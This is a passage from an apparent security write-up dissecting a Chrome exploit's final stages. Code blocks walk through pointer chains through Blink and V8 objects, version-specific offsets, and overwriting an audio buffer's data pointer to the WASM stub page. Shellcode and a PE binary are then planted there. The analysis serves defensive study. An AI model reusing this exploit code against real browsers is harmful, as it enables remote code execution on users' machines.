		<div id="crayon-676241da675e6555223054" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
fileReader.onerror = wasmFuncA;
 
let fileReaderPtr = read64(freelist, fileReaderLoaderPtr + BigInt(0x10)) - BigInt(0x68);
 
let vectorPtr = read64(freelist, fileReaderPtr + BigInt(0x28));
let registeredEventListenerPtr = read64(freelist, vectorPtr);
let eventListenerPtr = read64(freelist, registeredEventListenerPtr);
let eventHandlerPtr = read64(freelist, eventListenerPtr + BigInt(0x8));
let jsFunctionObjPtr = read64(freelist, eventHandlerPtr + BigInt(0x8));
 
let jsFunctionPtr = read64(freelist, jsFunctionObjPtr) - BigInt(1);
let sharedFuncInfoPtr = read64(freelist, jsFunctionPtr + BigInt(0x18)) - BigInt(1);
let wasmExportedFunctionDataPtr = read64(freelist, sharedFuncInfoPtr + BigInt(0x8)) - BigInt(1);
let wasmInstancePtr = read64(freelist, wasmExportedFunctionDataPtr + BigInt(0x10)) - BigInt(1);
 
let stubAddrFieldOffset = undefined;
switch (majorVersion) {
	case 77:
    		stubAddrFieldOffset = BigInt(0x8) * BigInt(16);
	break;
	case 76:
    		stubAddrFieldOffset = BigInt(0x8) * BigInt(17);
	break
}
 
let stubAddr = read64(freelist, wasmInstancePtr + stubAddrFieldOffset);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e6555223054-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-2">2</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-4">4</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-6">6</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-8">8</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-10">10</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-12">12</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-14">14</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-16">16</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-18">18</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-20">20</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-22">22</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-24">24</div><div class="crayon-num" data-line="crayon-676241da675e6555223054-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e6555223054-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e6555223054-1"><span class="crayon-i">fileReader</span><span class="crayon-sy">.</span><span class="crayon-i">onerror</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">wasmFuncA</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-2"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e6555223054-3"><span class="crayon-e">let </span><span class="crayon-i">fileReaderPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">fileReaderLoaderPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x10</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x68</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-4"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e6555223054-5"><span class="crayon-e">let </span><span class="crayon-i">vectorPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">fileReaderPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x28</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-6"><span class="crayon-e">let </span><span class="crayon-i">registeredEventListenerPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">vectorPtr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-7"><span class="crayon-e">let </span><span class="crayon-i">eventListenerPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">registeredEventListenerPtr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-8"><span class="crayon-e">let </span><span class="crayon-i">eventHandlerPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">eventListenerPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-9"><span class="crayon-e">let </span><span class="crayon-i">jsFunctionObjPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">eventHandlerPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-10"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e6555223054-11"><span class="crayon-e">let </span><span class="crayon-i">jsFunctionPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">jsFunctionObjPtr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-12"><span class="crayon-e">let </span><span class="crayon-i">sharedFuncInfoPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">jsFunctionPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x18</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-13"><span class="crayon-e">let </span><span class="crayon-i">wasmExportedFunctionDataPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">sharedFuncInfoPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-14"><span class="crayon-e">let </span><span class="crayon-i">wasmInstancePtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">wasmExportedFunctionDataPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x10</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>-<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-15"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-16"><span class="crayon-e">let </span><span class="crayon-i">stubAddrFieldOffset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">undefined</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-17"><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">majorVersion</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-18"><span class="crayon-h">	</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-cn">77</span><span class="crayon-sy">:</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">stubAddrFieldOffset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>*<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">16</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-20"><span class="crayon-h">	</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-21"><span class="crayon-h">	</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-cn">76</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">stubAddrFieldOffset</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>*<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">17</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-23"><span class="crayon-h">	</span><span class="crayon-st">break</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-24"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675e6555223054-25"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e6555223054-26"><span class="crayon-e">let </span><span class="crayon-i">stubAddr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">wasmInstancePtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">stubAddrFieldOffset</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The variable stubAddr contains the address of the page with the stub code that jumps to the JIT compiled WASM function. At this stage it&#8217;s sufficient to overwrite it with shellcode. To do so, the exploit uses the function <em>getPartitionPageFreeListHeadEntryBySlotSize()</em> again to find the next free block of 0x20 bytes, which is the size of the structure for the ArrayBuffer object. This object is created when the exploit creates a new audio buffer.</p>
		<div id="crayon-676241da675e7964519204" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let arrayBufferSize = 0x20;
let arrayBufferPtr = getPartitionPageFreeListHeadEntryBySlotSize(freelist, iirFilterFeedforwardAllocationPtr, arrayBufferSize);
if (!arrayBufferPtr)
	return;
 
let audioBuffer = audioCtx.createBuffer(1, 0x400, 6000);
gcPreventer.push(audioBuffer);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e7964519204-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e7964519204-2">2</div><div class="crayon-num" data-line="crayon-676241da675e7964519204-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e7964519204-4">4</div><div class="crayon-num" data-line="crayon-676241da675e7964519204-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e7964519204-6">6</div><div class="crayon-num" data-line="crayon-676241da675e7964519204-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e7964519204-1"><span class="crayon-e">let </span><span class="crayon-i">arrayBufferSize</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0x20</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e7964519204-2"><span class="crayon-e">let </span><span class="crayon-i">arrayBufferPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getPartitionPageFreeListHeadEntryBySlotSize</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">arrayBufferSize</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e7964519204-3"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">arrayBufferPtr</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e7964519204-4"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e7964519204-5"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e7964519204-6"><span class="crayon-e">let </span><span class="crayon-i">audioBuffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x400</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e7964519204-7"><span class="crayon-i">gcPreventer</span><span class="crayon-sy">.</span><span class="crayon-e">push</span><span class="crayon-sy">(</span><span class="crayon-i">audioBuffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The exploit uses arbitrary read/write primitives to get the address of the DataHolder class that contains the raw pointer to the data and size of the audio buffer. The exploit overwrites this pointer with stubAddr and sets a huge size.</p>
		<div id="crayon-676241da675e8228155143" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let dataHolderPtr = read64(freelist, arrayBufferPtr + BigInt(0x8));
 
write64(freelist, dataHolderPtr + BigInt(0x8), stubAddr);
write64(freelist, dataHolderPtr + BigInt(0x10), BigInt(0xFFFFFFF));</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e8228155143-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e8228155143-2">2</div><div class="crayon-num" data-line="crayon-676241da675e8228155143-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e8228155143-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e8228155143-1"><span class="crayon-e">let </span><span class="crayon-i">dataHolderPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">read64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">arrayBufferPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e8228155143-2"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675e8228155143-3"><span class="crayon-e">write64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dataHolderPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">stubAddr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e8228155143-4"><span class="crayon-e">write64</span><span class="crayon-sy">(</span><span class="crayon-i">freelist</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">dataHolderPtr</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x10</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0xFFFFFFF</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
Now all that&#8217;s needed is to implant a Uint8Array object into the memory of this audio buffer and place shellcode there along with the Portable Executable that will be executed by the shellcode.</p>
		<div id="crayon-676241da675e9900171323" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let payloadArray = new Uint8Array(audioBuffer.getChannelData(0).buffer);
payloadArray.set(shellcode, 0);
payloadArray.set(peBinary, shellcode.length);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675e9900171323-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675e9900171323-2">2</div><div class="crayon-num" data-line="crayon-676241da675e9900171323-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675e9900171323-1"><span class="crayon-e">let </span><span class="crayon-i">payloadArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Uint8Array</span><span class="crayon-sy">(</span><span class="crayon-i">audioBuffer</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675e9900171323-2"><span class="crayon-i">payloadArray</span><span class="crayon-sy">.</span><span class="crayon-e">set</span><span class="crayon-sy">(</span><span class="crayon-i">shellcode</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675e9900171323-3"><span class="crayon-i">payloadArray</span><span class="crayon-sy">.</span><span class="crayon-e">set</span><span class="crayon-sy">(</span><span class="crayon-i">peBinary</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">shellcode</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
To prevent the possibility of a crash the exploit clears the pointer to the top of the FreeList structure used by the PartitionPage.</p>
		<div id="crayon-676241da675ea478794217" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
write64(freelist, partitionPagePtr, BigInt(0));</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
